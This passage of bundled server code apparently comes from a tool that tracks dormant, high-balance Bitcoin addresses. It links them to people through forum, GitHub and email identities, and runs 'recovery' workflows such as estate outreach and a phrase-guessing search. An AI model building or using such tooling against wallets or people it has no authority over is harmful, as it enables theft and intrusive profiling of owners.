  if (scoreRepeated.phi === 1 && scoreRepeated.kappa === QIG_CONSTANTS.KAPPA_STAR) {
    violations.push("IMPURE: \u03A6 and \u03BA appear to be hardcoded to targets (1.0 and 64)");
  }
  if (violations.length > 0) {
    return { isPure: false, violations };
  }
  return { isPure: true, violations: [] };
}
var DIRICHLET_ALPHA;
var init_qig_pure_v2 = __esm({
  "server/qig-pure-v2.ts"() {
    "use strict";
    init_bip39_words();
    init_physics_constants();
    DIRICHLET_ALPHA = 0.5;
  }
});

// server/recovery-orchestrator.ts
var recovery_orchestrator_exports = {};
__export(recovery_orchestrator_exports, {
  formatConstraintsForDisplay: () => formatConstraintsForDisplay,
  getCompletionPercentage: () => getCompletionPercentage,
  initializeConstrainedSearchWorkflow: () => initializeConstrainedSearchWorkflow,
  initializeEstateWorkflow: () => initializeEstateWorkflow,
  initializeSocialWorkflow: () => initializeSocialWorkflow,
  initializeTemporalWorkflow: () => initializeTemporalWorkflow,
  initializeWorkflow: () => initializeWorkflow,
  isWorkflowComplete: () => isWorkflowComplete,
  updateConstrainedSearchProgress: () => updateConstrainedSearchProgress,
  updateEstateProgress: () => updateEstateProgress,
  updateSocialProgress: () => updateSocialProgress,
  updateTemporalProgress: () => updateTemporalProgress,
  updateWorkflowProgress: () => updateWorkflowProgress
});
function initializeEstateWorkflow(priority, entities2) {
  const deceasedEntity = entities2.find((e) => e.isDeceased && e.estateContact);
  const progress = {
    startedAt: /* @__PURE__ */ new Date(),
    tasksCompleted: 0,
    tasksTotal: 7,
    notes: [],
    estateProgress: {
      estateContactIdentified: !!deceasedEntity,
      estateContactInfo: deceasedEntity?.estateContact || void 0,
      outreachAttempts: 0,
      responseReceived: false,
      legalDocumentsRequested: false,
      legalDocumentsReceived: false,
      verificationStatus: "pending",
      recoveryExecuted: false
    }
  };
  if (deceasedEntity) {
    progress.notes.push(`Estate contact identified: ${deceasedEntity.estateContact}`);
    progress.tasksCompleted = 1;
  } else {
    progress.notes.push("WARNING: No estate contact found. Estate workflow cannot proceed.");
  }
  return progress;
}
function updateEstateProgress(currentProgress, update) {
  const estateProgress = {
    ...currentProgress.estateProgress,
    ...update
  };
  let tasksCompleted = 0;
  if (estateProgress.estateContactIdentified) tasksCompleted++;
  if (estateProgress.verificationStatus === "verified") tasksCompleted++;
  if (estateProgress.outreachAttempts > 0) tasksCompleted++;
  if (estateProgress.responseReceived) tasksCompleted++;
  if (estateProgress.legalDocumentsRequested) tasksCompleted++;
  if (estateProgress.legalDocumentsReceived) tasksCompleted++;
  if (estateProgress.recoveryExecuted) tasksCompleted++;
  return {
    ...currentProgress,
    estateProgress,
    tasksCompleted,
    lastUpdatedAt: /* @__PURE__ */ new Date()
  };
}
function formatConstraintsForDisplay(constraints) {
  if (!constraints) return [];
  const formatted = [];
  if (constraints.entityLinkage > 0) {
    formatted.push(`Entity linkage: ${constraints.entityLinkage} linked entities`);
  }
  if (constraints.artifactDensity > 0) {
    formatted.push(`Artifact density: ${constraints.artifactDensity.toFixed(2)} vectors`);
  }
  if (constraints.temporalPrecisionHours >= 1) {
    formatted.push(`Temporal precision: ${constraints.temporalPrecisionHours}h`);
  }
  if (constraints.graphSignature > 0) {
    formatted.push(`Graph signature: ${constraints.graphSignature} nodes`);
  }
  if (constraints.phiConstraints > 0) {
    formatted.push(`\u03A6_constraints: ${constraints.phiConstraints.toFixed(2)}`);
  }
  return formatted;
}
function initializeConstrainedSearchWorkflow(priority, _entities, _artifacts) {
  const constraints = formatConstraintsForDisplay(priority.constraints);
  const progress = {
    startedAt: /* @__PURE__ */ new Date(),
    tasksCompleted: 1,
    // Constraints identified
    tasksTotal: 6,
    notes: [
      `Constraints identified: ${constraints.join(", ")}`,
      `\u03BA_recovery = ${priority.kappaRecovery.toFixed(2)} (${priority.tier} priority)`
    ],
    constrainedSearchProgress: {
      constraintsIdentified: constraints,
      searchSpaceReduced: constraints.length > 0,
      qigParametersSet: false,
      searchStatus: "not_started",
      phrasesGenerated: 0,
      phrasesTested: 0,
      highPhiCount: 0,
      matchFound: false
    }
  };
  return progress;
}
function updateConstrainedSearchProgress(currentProgress, update) {
  const constrainedSearchProgress = {
    ...currentProgress.constrainedSearchProgress,
    ...update
  };
  let tasksCompleted = 1;
  if (constrainedSearchProgress.searchSpaceReduced) tasksCompleted++;
  if (constrainedSearchProgress.qigParametersSet) tasksCompleted++;
  if (constrainedSearchProgress.searchStatus !== "not_started") tasksCompleted++;
  if (constrainedSearchProgress.highPhiCount > 0) tasksCompleted++;
  if (constrainedSearchProgress.matchFound) tasksCompleted = 6;
  return {
    ...currentProgress,
    constrainedSearchProgress,
    tasksCompleted,
    lastUpdatedAt: /* @__PURE__ */ new Date()
  };
}
function initializeSocialWorkflow(priority, entities2, artifacts2) {
  const platforms = /* @__PURE__ */ new Set();
  artifacts2.forEach((artifact) => {
    if (artifact.source) {
      platforms.add(artifact.source);
    }
  });
  entities2.forEach((entity) => {
    if (entity.bitcoinTalkUsername) platforms.add("bitcointalk");
    if (entity.githubUsername) platforms.add("github");
    if (entity.emailAddresses && entity.emailAddresses.length > 0) platforms.add("email");
  });
  const progress = {
    startedAt: /* @__PURE__ */ new Date(),
    tasksCompleted: 1,
    // Platforms identified
    tasksTotal: 7,
    notes: [
      `Platforms identified: ${Array.from(platforms).join(", ")}`,
      `${entities2.length} entities, ${artifacts2.length} artifacts`
    ],
    socialProgress: {
      platformsIdentified: Array.from(platforms),
      outreachTemplatesCreated: false,
      communityPostsCreated: 0,
      directMessagesSet: 0,
      responsesReceived: 0,
      leadsGenerated: 0,
      verifiedLeads: 0
    }
  };
  return progress;
}
function updateSocialProgress(currentProgress, update) {
  const socialProgress = {
    ...currentProgress.socialProgress,
    ...update
  };
  let tasksCompleted = 1;
  if (socialProgress.outreachTemplatesCreated) tasksCompleted++;
  if (socialProgress.communityPostsCreated > 0) tasksCompleted++;
  if (socialProgress.directMessagesSet > 0) tasksCompleted++;
  if (socialProgress.responsesReceived > 0) tasksCompleted++;
  if (socialProgress.leadsGenerated > 0) tasksCompleted++;
  if (socialProgress.verifiedLeads > 0) tasksCompleted = 7;
  return {
    ...currentProgress,
    socialProgress,
    tasksCompleted,
    lastUpdatedAt: /* @__PURE__ */ new Date()
  };
}
function initializeTemporalWorkflow(priority, entities2, artifacts2) {
  const archives = /* @__PURE__ */ new Set();
  artifacts2.forEach((a) => archives.add(a.source));
  const progress = {
    startedAt: /* @__PURE__ */ new Date(),
    tasksCompleted: 1,
    // Archives identified
    tasksTotal: 7,
    notes: [
      `Archives identified: ${Array.from(archives).join(", ")}`,
      `${artifacts2.length} artifacts in time period`
    ],
    temporalProgress: {
      archivesIdentified: Array.from(archives),
      timePeriodNarrowed: false,
      artifactsAnalyzed: 0,
      patternsIdentified: [],
      temporalClustersFound: 0,
      confidenceScore: 0
    }
  };
  return progress;
}
function updateTemporalProgress(currentProgress, update) {
  const temporalProgress = {
    ...currentProgress.temporalProgress,
    ...update
  };
  let tasksCompleted = 1;
  if (temporalProgress.timePeriodNarrowed) tasksCompleted++;
  if (temporalProgress.artifactsAnalyzed > 0) tasksCompleted++;
  if (temporalProgress.patternsIdentified.length > 0) tasksCompleted++;
  if (temporalProgress.temporalClustersFound > 0) tasksCompleted++;
  if (temporalProgress.confidenceScore > 0.5) tasksCompleted++;
  if (temporalProgress.confidenceScore > 0.8) tasksCompleted = 7;
  return {
    ...currentProgress,
    temporalProgress,
    tasksCompleted,
    lastUpdatedAt: /* @__PURE__ */ new Date()
  };
}
function initializeWorkflow(vector, priority, entities2, artifacts2) {
  switch (vector) {
    case "estate":
      return initializeEstateWorkflow(priority, entities2);
    case "constrained_search":
      return initializeConstrainedSearchWorkflow(priority, entities2, artifacts2);
    case "social":
      return initializeSocialWorkflow(priority, entities2, artifacts2);
    case "temporal":
      return initializeTemporalWorkflow(priority, entities2, artifacts2);
    default:
      throw new Error(`Unknown recovery vector: ${vector}`);
  }
}
function updateWorkflowProgress(vector, currentProgress, update) {
  switch (vector) {
    case "estate":
      return updateEstateProgress(currentProgress, update);
    case "constrained_search":
      return updateConstrainedSearchProgress(currentProgress, update);
    case "social":
      return updateSocialProgress(currentProgress, update);
    case "temporal":
      return updateTemporalProgress(currentProgress, update);
    default:
      throw new Error(`Unknown recovery vector: ${vector}`);
  }
}
function isWorkflowComplete(progress) {
  return progress.tasksCompleted >= progress.tasksTotal;
}
function getCompletionPercentage(progress) {
  return Math.round(progress.tasksCompleted / progress.tasksTotal * 100);
}
var init_recovery_orchestrator = __esm({
  "server/recovery-orchestrator.ts"() {
    "use strict";
  }
});

// server/observer-storage.ts
var observer_storage_exports = {};
__export(observer_storage_exports, {
  ObserverStorage: () => ObserverStorage,
  observerStorage: () => observerStorage
});
import { eq as eq2, and, or, gte, lte, desc, asc, sql as sql2 } from "drizzle-orm";
var ObserverStorage, observerStorage;
var init_observer_storage = __esm({
  "server/observer-storage.ts"() {
    "use strict";
    init_db();
    init_schema();
    ObserverStorage = class {
      /**
       * Normalize legacy constraint field names to Task 7 schema
       * Returns new object with normalized fields (does not mutate original)
       * - linkedEntities → entityLinkage
       * - artifactCount → artifactDensity
       * - graphDegree → graphSignature
       */
      normalizeConstraints(constraints) {
        if (!constraints) return { normalized: constraints, hadLegacy: false };
        let hadLegacy = false;
        const normalized = { ...constraints };
        if (normalized.linkedEntities !== void 0) {
          normalized.entityLinkage = normalized.linkedEntities;
          delete normalized.linkedEntities;
          hadLegacy = true;
        }
        if (normalized.artifactCount !== void 0) {
          normalized.artifactDensity = normalized.artifactCount;
          delete normalized.artifactCount;
          hadLegacy = true;
        }
        if (normalized.graphDegree !== void 0) {
          normalized.graphSignature = normalized.graphDegree;
          delete normalized.graphDegree;
          hadLegacy = true;
        }
        return { normalized, hadLegacy };
      }
      /**
       * Normalize workflow progress JSON for constrained_search workflows
       * Regenerates constraintsIdentified display strings from normalized constraints
       */
      async normalizeWorkflowProgress(workflow) {
        if (!workflow.progress || workflow.vector !== "constrained_search") {
          return false;
        }
        const progress = workflow.progress;
        const constrainedSearchProgress = progress?.constrainedSearchProgress;
        if (!constrainedSearchProgress?.constraintsIdentified) {
          return false;
        }
        const hasLegacyStrings = constrainedSearchProgress.constraintsIdentified.some(
          (str) => str.includes("linked entities") || str.includes("artifact density") && !str.includes("Artifact density:") || str.includes("graph signature") && !str.includes("Graph signature:")
        );
        if (!hasLegacyStrings) {
          return false;
        }
        const priority = await this.getRecoveryPriority(workflow.address);
        if (!priority) {
          return false;
        }
        const { formatConstraintsForDisplay: formatConstraintsForDisplay2 } = await Promise.resolve().then(() => (init_recovery_orchestrator(), recovery_orchestrator_exports));
        const newConstraints = formatConstraintsForDisplay2(priority.constraints);
        progress.constrainedSearchProgress.constraintsIdentified = newConstraints;
        if (progress.notes) {
          progress.notes = progress.notes.map(
            (note) => note.replace(/(\d+) linked entities/g, "Entity linkage: $1 linked entities").replace(/(\d+\.\d+) artifact density/g, "Artifact density: $1 vectors").replace(/(\d+) graph signature/g, "Graph signature: $1 nodes")
          );
        }
        return true;
      }
      async saveBlock(block) {
        if (!db) throw new Error("Database not initialized");
        const [saved] = await db.insert(blocks).values(block).onConflictDoNothing({ target: blocks.height }).returning();
        if (!saved) {
          const existing = await this.getBlock(block.height);
          if (!existing) throw new Error(`Failed to save or retrieve block ${block.height}`);
          return existing;
        }
        return saved;
      }
      async getBlock(height) {
        if (!db) throw new Error("Database not initialized");
        const [block] = await db.select().from(blocks).where(eq2(blocks.height, height)).limit(1);
        return block || null;
      }
      async getBlocks(startHeight, endHeight) {
        if (!db) throw new Error("Database not initialized");
        return await db.select().from(blocks).where(and(
          gte(blocks.height, startHeight),
          lte(blocks.height, endHeight)
        )).orderBy(asc(blocks.height));
      }
      async getLatestBlockHeight() {
        if (!db) throw new Error("Database not initialized");
        const [result] = await db.select({ maxHeight: sql2`MAX(${blocks.height})` }).from(blocks).limit(1);
        return result?.maxHeight ?? null;
      }
      async saveTransaction(tx) {
        if (!db) throw new Error("Database not initialized");
        const [saved] = await db.insert(transactions).values(tx).onConflictDoNothing({ target: transactions.txid }).returning();
        if (!saved) {
          const existing = await this.getTransaction(tx.txid);
          if (!existing) throw new Error(`Failed to save or retrieve transaction ${tx.txid}`);
          return existing;
        }
        return saved;
      }
      async getTransaction(txid) {
        if (!db) throw new Error("Database not initialized");
        const [tx] = await db.select().from(transactions).where(eq2(transactions.txid, txid)).limit(1);
        return tx || null;
      }
      async getTransactionsForBlock(blockHeight) {
        if (!db) throw new Error("Database not initialized");
        return await db.select().from(transactions).where(eq2(transactions.blockHeight, blockHeight));
      }
      async saveAddress(address) {
        if (!db) throw new Error("Database not initialized");
        const [saved] = await db.insert(addresses).values(address).onConflictDoUpdate({
          target: addresses.address,
          set: {
            // Only update if new activity is MORE RECENT
            lastActivityHeight: sql2`GREATEST(${addresses.lastActivityHeight}, ${address.lastActivityHeight})`,
            lastActivityTxid: sql2`CASE WHEN ${address.lastActivityHeight} > ${addresses.lastActivityHeight} THEN ${address.lastActivityTxid} ELSE ${addresses.lastActivityTxid} END`,
            lastActivityTimestamp: sql2`CASE WHEN ${address.lastActivityHeight} > ${addresses.lastActivityHeight} THEN ${address.lastActivityTimestamp} ELSE ${addresses.lastActivityTimestamp} END`,
            // Update balance ONLY if observation is more recent (or equal - to handle same-block updates)
            // Note: Proper UTXO tracking in Phase 2 will compute balance from full UTXO set
            currentBalance: sql2`CASE WHEN ${address.lastActivityHeight} >= ${addresses.lastActivityHeight} THEN ${address.currentBalance} ELSE ${addresses.currentBalance} END`,
            // Dormancy is calculated by dormancy-updater, preserve existing value
            dormancyBlocks: addresses.dormancyBlocks,
            isDormant: addresses.isDormant,
            // Update geometric signatures ONLY if observation is more recent
            // This prevents rescanning old blocks from corrupting modern signatures
            temporalSignature: sql2`CASE WHEN ${address.lastActivityHeight} >= ${addresses.lastActivityHeight} THEN ${address.temporalSignature} ELSE ${addresses.temporalSignature} END`,
            valueSignature: sql2`CASE WHEN ${address.lastActivityHeight} >= ${addresses.lastActivityHeight} THEN ${address.valueSignature} ELSE ${addresses.valueSignature} END`,
            graphSignature: sql2`CASE WHEN ${address.lastActivityHeight} >= ${addresses.lastActivityHeight} THEN ${address.graphSignature} ELSE ${addresses.graphSignature} END`,
            scriptSignature: sql2`CASE WHEN ${address.lastActivityHeight} >= ${addresses.lastActivityHeight} THEN ${address.scriptSignature} ELSE ${addresses.scriptSignature} END`,
            updatedAt: /* @__PURE__ */ new Date()
          }
        }).returning();
        return saved;
      }
      async updateAddress(addressStr, updates) {
        if (!db) throw new Error("Database not initialized");
        await db.update(addresses).set({ ...updates, updatedAt: /* @__PURE__ */ new Date() }).where(eq2(addresses.address, addressStr));
      }
      async getAddress(addressStr) {
        if (!db) throw new Error("Database not initialized");
        const [address] = await db.select().from(addresses).where(eq2(addresses.address, addressStr)).limit(1);
        return address || null;
      }
      async getDormantAddresses(filters) {
        if (!db) throw new Error("Database not initialized");
        const conditions = [];
        conditions.push(eq2(addresses.isDormant, true));
        if (filters?.minBalance !== void 0) {
          conditions.push(gte(addresses.currentBalance, BigInt(filters.minBalance)));
        }
        if (filters?.minInactivityDays !== void 0) {
          const inactivityThreshold = /* @__PURE__ */ new Date();
          inactivityThreshold.setDate(inactivityThreshold.getDate() - filters.minInactivityDays);
          conditions.push(lte(addresses.lastActivityTimestamp, inactivityThreshold));
        }
        let query = db.select().from(addresses).where(and(...conditions));
        query = query.orderBy(desc(addresses.currentBalance));
        if (filters?.limit !== void 0) {
          query = query.limit(filters.limit);
        }
        if (filters?.offset !== void 0) {
          query = query.offset(filters.offset);
        }
        return await query;
      }
      async getAllAddresses(limit, offset) {
        if (!db) throw new Error("Database not initialized");
        let query = db.select().from(addresses).orderBy(asc(addresses.firstSeenHeight));
        if (limit !== void 0) {
          query = query.limit(limit);
        }
        if (offset !== void 0) {
          query = query.offset(offset);
        }
        return await query;
      }
      async saveEntity(entity) {
        if (!db) throw new Error("Database not initialized");
        const [saved] = await db.insert(entities).values(entity).returning();
        return saved;
      }
      async getEntity(id) {
        if (!db) throw new Error("Database not initialized");
        const [entity] = await db.select().from(entities).where(eq2(entities.id, id)).limit(1);
        return entity || null;
      }
      async getEntities(type) {
        if (!db) throw new Error("Database not initialized");
        if (type) {
          return await db.select().from(entities).where(eq2(entities.type, type));
        }
        return await db.select().from(entities);
      }
      async updateEntity(id, updates) {
        if (!db) throw new Error("Database not initialized");
        await db.update(entities).set({ ...updates, updatedAt: /* @__PURE__ */ new Date() }).where(eq2(entities.id, id));
      }
      async searchEntities(filters) {
        if (!db) throw new Error("Database not initialized");
        const conditions = [];
        if (filters?.name) {
          conditions.push(sql2`LOWER(${entities.name}) LIKE LOWER(${"%" + filters.name + "%"})`);
        }
        if (filters?.bitcoinTalkUsername) {
          conditions.push(eq2(entities.bitcoinTalkUsername, filters.bitcoinTalkUsername));
        }
        if (filters?.githubUsername) {
          conditions.push(eq2(entities.githubUsername, filters.githubUsername));
        }
        if (filters?.email) {
          conditions.push(sql2`${filters.email} = ANY(${entities.emailAddresses})`);
        }
        if (filters?.alias) {
          conditions.push(sql2`${filters.alias} = ANY(${entities.aliases})`);
        }
        if (filters?.type) {
          conditions.push(eq2(entities.type, filters.type));
        }
        let query = db.select().from(entities);
        if (conditions.length > 0) {
          const whereClause = conditions.length === 1 ? conditions[0] : and(...conditions);
          query = query.where(whereClause);
        }
        if (filters?.limit !== void 0) {
          query = query.limit(filters.limit);
        }
        if (filters?.offset !== void 0) {
          query = query.offset(filters.offset);
        }
        return await query;
      }
      async findEntityByIdentity(identity) {
        if (!db) throw new Error("Database not initialized");
        const conditions = [];
        if (identity.bitcoinTalkUsername) {
          conditions.push(eq2(entities.bitcoinTalkUsername, identity.bitcoinTalkUsername));
        }
        if (identity.githubUsername) {
          conditions.push(eq2(entities.githubUsername, identity.githubUsername));
        }
        if (identity.email) {
          conditions.push(sql2`${identity.email} = ANY(${entities.emailAddresses})`);
        }
        if (conditions.length === 0) {
          return null;
        }
        const whereClause = conditions.length === 1 ? conditions[0] : or(...conditions);
        const [entity] = await db.select().from(entities).where(whereClause).limit(1);
        return entity || null;
      }
      async saveArtifact(artifact) {
        if (!db) throw new Error("Database not initialized");
        const [saved] = await db.insert(artifacts).values(artifact).returning();
        return saved;
      }
      async getArtifacts(filters) {
        if (!db) throw new Error("Database not initialized");
        const conditions = [];
        if (filters?.entityId) {
          conditions.push(eq2(artifacts.entityId, filters.entityId));
        }
        if (filters?.source) {
          conditions.push(eq2(artifacts.source, filters.source));
        }
        if (conditions.length > 0) {
          const whereClause = conditions.length === 1 ? conditions[0] : and(...conditions);
          return await db.select().from(artifacts).where(whereClause);
        }
        return await db.select().from(artifacts);
      }
      async getEntitiesByAddress(address) {
        if (!db) throw new Error("Database not initialized");
        return await db.select().from(entities).where(sql2`${address} = ANY(${entities.knownAddresses})`);
      }
      async getArtifactsByAddress(address) {
        if (!db) throw new Error("Database not initialized");
        return await db.select().from(artifacts).where(sql2`${address} = ANY(${artifacts.relatedAddresses})`);
      }
      async saveRecoveryPriority(priority) {
        if (!db) throw new Error("Database not initialized");
        const [saved] = await db.insert(recoveryPriorities).values(priority).returning();
        return saved;
      }
      async updateRecoveryPriority(id, updates) {
        if (!db) throw new Error("Database not initialized");
        await db.update(recoveryPriorities).set({ ...updates, updatedAt: /* @__PURE__ */ new Date() }).where(eq2(recoveryPriorities.id, id));
      }
      async getRecoveryPriorities(filters) {
        if (!db) throw new Error("Database not initialized");
        const conditions = [];
        if (filters?.minKappa !== void 0) {
          conditions.push(gte(recoveryPriorities.kappaRecovery, filters.minKappa));
        }
        if (filters?.maxKappa !== void 0) {
          conditions.push(lte(recoveryPriorities.kappaRecovery, filters.maxKappa));
        }
        if (filters?.status) {
          conditions.push(eq2(recoveryPriorities.recoveryStatus, filters.status));
        }
        let query = db.select().from(recoveryPriorities);
        if (conditions.length > 0) {
          const whereClause = conditions.length === 1 ? conditions[0] : and(...conditions);
          query = query.where(whereClause);
        }
        query = query.orderBy(desc(recoveryPriorities.kappaRecovery));
        if (filters?.limit !== void 0) {
          query = query.limit(filters.limit);
        }
        if (filters?.offset !== void 0) {
          query = query.offset(filters.offset);
        }
        const priorities = await query;
        for (const priority of priorities) {
          const { normalized, hadLegacy } = this.normalizeConstraints(priority.constraints);
          priority.constraints = normalized;
          if (hadLegacy) {
            console.log(`[ObserverStorage] Write-through migration: priority ${priority.address}`);
            await db.update(recoveryPriorities).set({ constraints: normalized, updatedAt: /* @__PURE__ */ new Date() }).where(eq2(recoveryPriorities.address, priority.address));
          }
        }
        return priorities;
      }
      async getRecoveryPriority(address) {
        if (!db) throw new Error("Database not initialized");
        const [priority] = await db.select().from(recoveryPriorities).where(eq2(recoveryPriorities.address, address)).limit(1);
        if (!priority) return null;
        const { normalized, hadLegacy } = this.normalizeConstraints(priority.constraints);
        priority.constraints = normalized;
        if (hadLegacy) {
          console.log(`[ObserverStorage] Write-through migration: priority ${address}`);
          await db.update(recoveryPriorities).set({ constraints: normalized, updatedAt: /* @__PURE__ */ new Date() }).where(eq2(recoveryPriorities.address, address));
        }
        return priority;
      }
      async saveRecoveryWorkflow(workflow) {
        if (!db) throw new Error("Database not initialized");
        const [saved] = await db.insert(recoveryWorkflows).values(workflow).returning();
        return saved;
      }
      async updateRecoveryWorkflow(id, updates) {
        if (!db) throw new Error("Database not initialized");
        await db.update(recoveryWorkflows).set({ ...updates, updatedAt: /* @__PURE__ */ new Date() }).where(eq2(recoveryWorkflows.id, id));
      }
      async getRecoveryWorkflows(filters) {
        if (!db) throw new Error("Database not initialized");
        const conditions = [];
        if (filters?.address) {
          conditions.push(eq2(recoveryWorkflows.address, filters.address));
        }
        if (filters?.vector) {
          conditions.push(eq2(recoveryWorkflows.vector, filters.vector));
        }
        if (filters?.status) {
          conditions.push(eq2(recoveryWorkflows.status, filters.status));
        }
        let workflows;
        if (conditions.length > 0) {
          const whereClause = conditions.length === 1 ? conditions[0] : and(...conditions);
          workflows = await db.select().from(recoveryWorkflows).where(whereClause);
        } else {
          workflows = await db.select().from(recoveryWorkflows);
        }
        for (const workflow of workflows) {
          const wasNormalized = await this.normalizeWorkflowProgress(workflow);
          if (wasNormalized) {
            console.log(`[ObserverStorage] Write-through migration: workflow ${workflow.id} progress`);
            await db.update(recoveryWorkflows).set({ progress: workflow.progress, updatedAt: /* @__PURE__ */ new Date() }).where(eq2(recoveryWorkflows.id, workflow.id));
          }
        }
        return workflows;
      }
      async getRecoveryWorkflow(id) {
        if (!db) throw new Error("Database not initialized");
        const [workflow] = await db.select().from(recoveryWorkflows).where(eq2(recoveryWorkflows.id, id)).limit(1);
        if (!workflow) return null;
        const wasNormalized = await this.normalizeWorkflowProgress(workflow);
        if (wasNormalized) {
          console.log(`[ObserverStorage] Write-through migration: workflow ${id} progress`);
          await db.update(recoveryWorkflows).set({ progress: workflow.progress, updatedAt: /* @__PURE__ */ new Date() }).where(eq2(recoveryWorkflows.id, id));
        }
        return workflow;
      }
      async findWorkflowBySearchJobId(searchJobId) {
        if (!db) throw new Error("Database not initialized");
        const allWorkflows = await db.select().from(recoveryWorkflows);
        for (const workflow of allWorkflows) {
          const progress = workflow.progress;
          const searchProgress = progress?.constrainedSearchProgress;
          if (searchProgress?.searchJobId === searchJobId) {
            await this.normalizeWorkflowProgress(workflow);
            return workflow;
          }
        }
        return null;
      }
    };
    observerStorage = new ObserverStorage();
  }
});

// server/dormancy-updater.ts
async function updateAddressDormancy(latestBlockHeight) {
  console.log(`[DormancyUpdater] Updating dormancy for addresses (latest block: ${latestBlockHeight})`);
  const pageSize = 100;
  let offset = 0;
  let processedCount = 0;
  let dormantCount = 0;
  while (true) {
    const addresses2 = await observerStorage.getAllAddresses(pageSize, offset);
    if (addresses2.length === 0) break;
    for (const address of addresses2) {
      const dormancyBlocks = Math.max(0, latestBlockHeight - address.lastActivityHeight);
      const isDormant = dormancyBlocks >= 52e3;
      if (address.dormancyBlocks !== dormancyBlocks || address.isDormant !== isDormant) {
        await observerStorage.updateAddress(address.address, {
          dormancyBlocks,
          isDormant
        });
        if (isDormant && !address.isDormant) {
          dormantCount++;
        }
      }
      processedCount++;
    }
    offset += pageSize;
  }
  console.log(`[DormancyUpdater] Updated ${processedCount} addresses, ${dormantCount} newly dormant`);
}
var init_dormancy_updater = __esm({
  "server/dormancy-updater.ts"() {
    "use strict";
    init_observer_storage();
  }
});

// server/blockchain-api-router.ts
var blockchain_api_router_exports = {};
__export(blockchain_api_router_exports, {
  getAddressData: () => getAddressData,
  getCombinedCapacity: () => getCombinedCapacity,
  getProviderStats: () => getProviderStats,
  resetProvider: () => resetProvider
});
function getNextProvider() {
  const enabledProviders = Object.entries(PROVIDERS).filter(([_, p]) => p.enabled).sort((a, b) => {
    const aCanRequest = rateLimiter.canMakeRequest(a[0]);
    const bCanRequest = rateLimiter.canMakeRequest(b[0]);
    if (aCanRequest && !bCanRequest) return -1;
    if (!aCanRequest && bCanRequest) return 1;
    if (a[1].reliability !== b[1].reliability) {
      return b[1].reliability - a[1].reliability;
    }
    return a[1].lastUsed - b[1].lastUsed;
  });
  if (enabledProviders.length === 0) return null;
  const [providerId, provider] = enabledProviders[0];
  if (!rateLimiter.canMakeRequest(providerId)) {
    for (let i = 1; i < enabledProviders.length; i++) {
      const [nextId, nextProvider] = enabledProviders[i];
      if (rateLimiter.canMakeRequest(nextId)) {
        return nextProvider;
      }
    }
    return null;
  }
  return provider;
}
function normalizeAddressData(data, provider) {
  const providerName = provider.name;
  if (providerName === "Blockstream" || providerName === "Mempool.space") {
    return {
      address: data.address || "",
      balance: data.chain_stats?.funded_txo_sum - data.chain_stats?.spent_txo_sum || 0,
      totalReceived: data.chain_stats?.funded_txo_sum || 0,
      totalSent: data.chain_stats?.spent_txo_sum || 0,
      txCount: data.chain_stats?.tx_count || 0,
      unconfirmedBalance: data.mempool_stats?.funded_txo_sum - data.mempool_stats?.spent_txo_sum || 0
    };
  }
  if (providerName === "BlockCypher") {
    return {
      address: data.address || "",
      balance: data.balance || 0,
      totalReceived: data.total_received || 0,
      totalSent: data.total_sent || 0,
      txCount: data.n_tx || 0,
      unconfirmedBalance: data.unconfirmed_balance || 0
    };
  }
  if (providerName === "Blockchain.com") {
    return {
      address: data.address || "",
      balance: data.final_balance || 0,
      totalReceived: data.total_received || 0,
      totalSent: data.total_sent || 0,
      txCount: data.n_tx || 0,
      unconfirmedBalance: 0
    };
  }
  if (providerName === "Chain.so") {
    return {
      address: data.data?.address || "",
      balance: parseFloat(data.data?.confirmed_balance || "0") * 1e8,
      // BTC to satoshis
      totalReceived: parseFloat(data.data?.received_value || "0") * 1e8,
      totalSent: parseFloat(data.data?.sent_value || "0") * 1e8,
      txCount: parseInt(data.data?.tx_count || "0", 10),
      unconfirmedBalance: 0
    };
  }
  return {
    address: "",
    balance: 0,
    totalReceived: 0,
    totalSent: 0,
    txCount: 0,
    unconfirmedBalance: 0
  };
}
async function getAddressData(address) {
  const maxRetries = Object.keys(PROVIDERS).length;
  let attempts = 0;
  while (attempts < maxRetries) {
    const provider = getNextProvider();
    if (!provider) {
      console.log("[BlockchainAPI] All providers rate limited or unavailable");
      await new Promise((resolve) => setTimeout(resolve, 5e3));
      attempts++;
      continue;
    }
    try {
      const url = `${provider.baseUrl}${provider.endpoints.address.replace("{address}", address)}`;
      console.log(`[BlockchainAPI] Fetching ${address} from ${provider.name}`);
      const response = await fetch(url, {
        headers: {
          "Accept": "application/json",
          "User-Agent": "SearchSpaceCollapse/1.0"
        },
        signal: AbortSignal.timeout(1e4)
        // 10s timeout
      });
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
      const data = await response.json();
      rateLimiter.recordRequest(provider.name.toLowerCase().replace(/[^a-z]/g, ""));
      provider.lastUsed = Date.now();
      provider.successCount++;
      const normalized = normalizeAddressData(data, provider);
      console.log(`[BlockchainAPI] Success: ${address} balance=${normalized.balance} satoshis (${provider.name})`);
      return normalized;
    } catch (error) {
      console.error(`[BlockchainAPI] Error with ${provider.name}:`, error);
      provider.errorCount++;
      if (provider.errorCount > 10 && provider.errorCount / (provider.successCount + 1) > 0.5) {
        console.log(`[BlockchainAPI] Disabling ${provider.name} due to high error rate`);
        provider.enabled = false;
      }
      attempts++;
    }
  }
  console.error(`[BlockchainAPI] Failed to fetch ${address} after ${attempts} attempts`);
  return null;
}
function getProviderStats() {
  return Object.entries(PROVIDERS).map(([id, provider]) => {
    const total = provider.successCount + provider.errorCount;
    const successRate = total > 0 ? provider.successCount / total : 0;
    return {
      name: provider.name,
      enabled: provider.enabled,
      reliability: provider.reliability,
      successCount: provider.successCount,
      errorCount: provider.errorCount,
      successRate,
      rateLimitStatus: rateLimiter.getStats(id)
    };
  });
}
function resetProvider(providerName) {
  const provider = Object.values(PROVIDERS).find((p) => p.name === providerName);
  if (provider) {
    provider.enabled = true;
    provider.errorCount = 0;
    console.log(`[BlockchainAPI] Reset provider: ${providerName}`);
  }
}
function getCombinedCapacity() {
  return Object.values(PROVIDERS).filter((p) => p.enabled).reduce((sum, p) => sum + p.rateLimit.recommended, 0);
}
var PROVIDERS, RateLimiter, rateLimiter;
var init_blockchain_api_router = __esm({
  "server/blockchain-api-router.ts"() {
    "use strict";
    PROVIDERS = {
      blockstream: {
        name: "Blockstream",
        baseUrl: "https://blockstream.info/api",
        rateLimit: {
          documented: "none",
          recommended: 60
        },
        endpoints: {
          address: "/address/{address}",
          txs: "/address/{address}/txs",
          utxo: "/address/{address}/utxo"
        },
        reliability: 10,
        cost: "FREE",
        enabled: true,
        lastUsed: 0,
        errorCount: 0,
        successCount: 0
      },
      mempool: {
        name: "Mempool.space",
